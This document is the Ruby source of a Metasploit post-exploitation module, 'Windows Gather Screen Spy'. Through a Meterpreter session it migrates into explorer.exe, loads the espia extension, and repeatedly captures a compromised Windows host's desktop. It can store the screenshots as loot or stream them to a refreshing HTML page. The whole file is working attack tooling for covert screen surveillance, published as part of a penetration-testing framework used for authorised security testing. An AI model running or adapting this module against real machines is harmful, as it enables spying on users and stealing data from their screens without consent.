##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rbconfig'

class Metasploit3 < Msf::Post
  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Windows Gather Screen Spy',
      'Description'    => %q{
          This module will incrementally take desktop screenshots from the host. This
        allows for screen spying which can be useful to determine if there is an active
        user on a machine, or to record the screen for later data extraction.
        NOTES:  set VIEW_CMD to control how screenshots are opened/displayed, the file name
        will be appended directly on to the end of the value of VIEW_CMD (use 'auto' to
        have the module do it's best...default browser for Windows, firefox for *nix, and
        preview app for macs).  'eog -s -f -w' is a handy VIEW_CMD for *nix.  To suppress
        opening of screenshots all together, set the VIEW_CMD option to 'none'.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
          'bannedit', # post module
          'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support,log x approach, nx
          'Adrian Kubok' # better record file names
        ],
      'Platform'       => ['win'], # @todo add support for posix meterpreter somehow?
      'SessionTypes'   => ['meterpreter']
    ))

    register_options(
      [
        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
        OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
        OptString.new('VIEW_CMD', [false, 'Command to use for viewing screenshots (auto, none also accepted)', 'auto']),
        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them',false]),
        OptBool.new('HTML_STREAM', [false, 'Record to a refreshing HTML page',true])
      ], self.class)
  end

  def html_view(ip)
    html = %q{<html> <head> <meta http-equiv="Refresh" content="5"> </head> <body> <h2 align="center">}
    html << %Q{#{ip}</h2> <img src="./#{ip}.jpg" align="center" width=1024> <hr> </body> </html>}
  end

  def html_stream
    datastore['HTML_STREAM']
  end

  def run
    host = session.session_host
    screenshot = Msf::Config.get_config_root + "/logs/" + host + ".jpg"

    if html_stream
      html_file = Msf::Config.get_config_root + "/logs/" + host + ".html"
      begin
        File.open(html_file, 'wb') {|f| f.write html_view(host)}
      rescue IOError, Errno::ENOENT
        print_error "Failed to write html file -- file locking problems?"
        return nil
      end
    end

    migrate_explorer
    if session.platform !~ /win32|win64/i
      print_error("Unsupported Platform")
      return
    end

    begin
      session.core.use("espia")
    rescue ::Exception => e
      print_error("Failed to load espia extension (#{e.to_s})")
      return
    end

    # here we check for the local platform to determine what to do when 'auto' is selected
    if datastore['VIEW_CMD'].downcase == 'auto'
      case ::RbConfig::CONFIG['host_os']
      when /mac|darwin/
        cmd = "open file://#{screenshot}" # this will use preview usually
      when /mswin|win|mingw/
        cmd = "start iexplore.exe \"file://#{screenshot}\""
      when /linux|cygwin/
        # This opens a new tab for each screenshot, but I don't see a better way
        cmd = "firefox file://#{screenshot} &"
      else # bsd/sun/solaris might be different, but for now...
        cmd = "firefox file://#{screenshot} &"
      end
    elsif datastore['VIEW_CMD'].downcase == 'none'
      cmd = nil
    else
      cmd = "#{datastore['VIEW_CMD']}#{screenshot}"
    end

    begin
      count = datastore['COUNT']
      print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
      print_status "Writing refreshing html to #{html_file}" if html_stream
      # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
      leading_zeros = Math::log10(count).round
      file_locations = []
      count.times do |num|
        select(nil, nil, nil, datastore['DELAY'])
        vprint_status "#{host}: [#{Time.now}] Took screenshot (#{num}/#{count})"
        begin
          data = session.espia.espia_image_get_dev_screen
        rescue RequestError => e
          print_error("Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
          return false
        end
        if data
          if datastore['RECORD']
            # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
            fn = "screenshot.%0#{leading_zeros}d.jpg" % num
            file_locations << store_loot("screenspy.screenshot", "image/jpg", session, data, fn, "Screenshot")
          end

          # also write to disk temporarily so we can display in browser.  They may or may not have been RECORDed.
          if cmd || html_stream # do this if they have not suppressed VIEW_CMD display
            fd = ::File.new(screenshot, 'wb')
            fd.write(data)
            fd.close
          end
        end
        system(cmd) if cmd
      end
    rescue IOError, Errno::ENOENT => e
      print_error("Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
      return
    end
    print_status("Screen Spying Complete")
    if file_locations and not file_locations.empty?
      print_status "run loot -t screenspy.screenshot to see file locations of your newly acquired loot"
    end
    if cmd
      # wait 2 secs so the last file can get opened before deletion
      select(nil, nil, nil, 2)
      begin
        ::File.delete(screenshot)
      rescue Exception => e
        print_error("Error deleting the temporary screenshot file: #{e.class} #{e} #{e.backtrace}")
        print_error("This may be due to the file being in use if you are on a Windows platform")
      end
    end
  end

  def migrate_explorer
    pid = session.sys.process.getpid
    session.sys.process.get_processes.each do |p|
      if p['name'] == 'explorer.exe' and p['pid'] != pid
        print_status("Migrating to explorer.exe pid: #{p['pid']}")
        begin
          session.core.migrate(p['pid'].to_i)
          print_status("Migration successful")
          return p['pid']
        rescue
          print_status("Migration failed.")
          return nil
        end
      end
    end
  end
end
